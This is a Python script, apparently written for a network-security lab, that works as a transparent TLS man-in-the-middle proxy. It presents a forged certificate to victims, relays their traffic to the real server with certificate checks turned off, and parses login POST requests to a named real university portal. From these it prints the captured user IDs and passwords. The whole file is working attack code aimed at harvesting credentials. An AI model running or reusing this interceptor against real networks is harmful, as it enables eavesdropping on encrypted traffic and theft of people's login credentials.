#!/usr/bin/env python3
import os
import sys
import threading
import socket
import ssl
import struct
from urllib.parse import parse_qs
from queue import Queue

SO_ORIGINAL_DST = 80
extract_queue = Queue()

def main():
    if len(sys.argv) < 3:
        print("Usage: sudo python3 attack.py <victim_ip> <interface>")
        sys.exit(1)
    target_ip = sys.argv[1]
    target_interface = sys.argv[2]
    bugging_port = 8080
    try:

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        server_socket.bind(("0.0.0.0", bugging_port))
        server_socket.listen(10)

        while(True):
            client_conn, addr = server_socket.accept()
            handler = threading.Thread(target=proxy_handler, args=(client_conn, addr))
            handler.start()
    except Exception as e:
        print(f"Error setting up server: {e}")
    finally:
        server_socket.close()
def sni_callback(sock, server_name, context):
    sock.sni = server_name

def proxy_handler(client_conn, addr):
    try:
        
        dst_addr = client_conn.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
        dst_ip = socket.inet_ntoa(dst_addr[4:8])
        dst_port = struct.unpack('!H', dst_addr[2:4])[0]
        hostname = dst_ip

        # connect to victim
        context_client = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context_client.load_cert_chain(certfile="../certificates/host.crt", keyfile="../certificates/host.key")
        context_client.set_servername_callback(sni_callback)
        tls_client_sock = context_client.wrap_socket(client_conn, server_side=True) 

        hostname = getattr(tls_client_sock, 'sni', None) or dst_ip

        # connect to server
        remote_socket = socket.create_connection((dst_ip, dst_port))
        context_remote = ssl._create_unverified_context()
        tls_remote_sock = context_remote.wrap_socket(remote_socket, server_hostname=hostname)
        print(f"TLS Connection Established : [{dst_ip}:{dst_port}]") 


        # forward data
        t1 = threading.Thread(target=piping, args=(tls_client_sock, tls_remote_sock, True))
        t2 = threading.Thread(target=piping, args=(tls_remote_sock, tls_client_sock, False))
        t1.start()
        t2.start()
    except Exception as e:
        print(f"Error handling client connection: {e}")
        #pass
    finally:
        client_conn.close()

def piping(src, dst, extract=False):
    buffer = b""
    try:
        while True:
            data = src.recv(8192)
            if not data:
                break
            dst.sendall(data)
            if extract:
                buffer += data
                while True:
                    header_end = buffer.find(b"\r\n\r\n")
                    if header_end == -1:
                        break
                    headers = buffer[:header_end].decode('utf-8', errors='ignore')
                    content_length = 0
                    for line in headers.split("\r\n"):
                        if line.lower().startswith("content-length:"):
                            try:
                                content_length = int(line.split(":")[1].strip())
                            except:
                                content_length = 0
                            break
                    total_length = header_end + 4 + content_length
                    if len(buffer) < total_length:
                        break
                    full_request = buffer[:total_length]
                    extract_queue.put(full_request)
                    buffer = buffer[total_length:]
    except Exception as e:
        print(f"Error in piping: {e}")
        #pass
    finally:
        src.close()
        dst.close()

def extract_worker():
    while True:
        data = extract_queue.get()
        if data is None:
            break
        extract_packets(data)

extract_thread = threading.Thread(target=extract_worker, daemon=True)
extract_thread.start()

def extract_packets(data):
    try:
        decoded_data = data.decode('utf-8', errors='ignore')
        lines = decoded_data.split("\r\n")
        if lines and lines[0].startswith("POST"):
            # POST //portal.nycu.edu.tw/portal/api/PortalLdapLogin
            parts = lines[0].split()
            if len(parts) >= 2:
                url = parts[1]
                if "/portal/api/PortalLdapLogin" in url:
                    if "\r\n\r\n" in decoded_data:
                        headers, body = decoded_data.split("\r\n\r\n", 1)
                        params = parse_qs(body)
                        user_id = params.get("id", [None])[0]
                        password = params.get("pwd", [None])[0]
                        if user_id and password:
                            print(f"id: {user_id}, password: {password}")
    except Exception as e:
        print(f"Error extracting packets: {e}")
    finally:
        pass
if __name__ == "__main__":
    main()
